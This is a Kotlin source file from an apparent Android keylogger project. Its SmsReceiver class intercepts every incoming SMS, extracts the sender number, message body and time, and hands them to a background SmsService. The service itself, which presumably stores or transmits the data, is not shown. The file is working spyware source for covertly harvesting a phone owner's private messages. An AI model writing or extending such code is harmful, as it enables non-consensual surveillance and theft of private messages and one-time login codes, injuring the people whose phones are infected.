package com.azamovhudstc.androidkeylogger.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.azamovhudstc.androidkeylogger.model.SMSData
import com.azamovhudstc.androidkeylogger.service.SmsService
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Locale

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action
        if (action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras
            if (bundle != null) {
                val pdus = bundle.get("pdus") as Array<*>
                for (i in pdus.indices) {
                    val smsMessage = android.telephony.SmsMessage.createFromPdu(pdus[i] as ByteArray)
                    val senderPhoneNumber = smsMessage.originatingAddress
                    val messageBody = smsMessage.messageBody
                    val receivedTime = smsMessage.timestampMillis


                    val smsData = SMSData(messageBody ?: "", senderPhoneNumber ?: "", convertMillisToReadableTime(receivedTime))
                    val serviceIntent = Intent(context, SmsService::class.java)
                    serviceIntent.putExtra("smsData", smsData)
                    context.startService(serviceIntent)
                }
            }
        }
    }
    private fun convertMillisToReadableTime(timestamp: Long): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        val calendar = Calendar.getInstance()
        calendar.timeInMillis = timestamp
        return sdf.format(calendar.time)
    }
}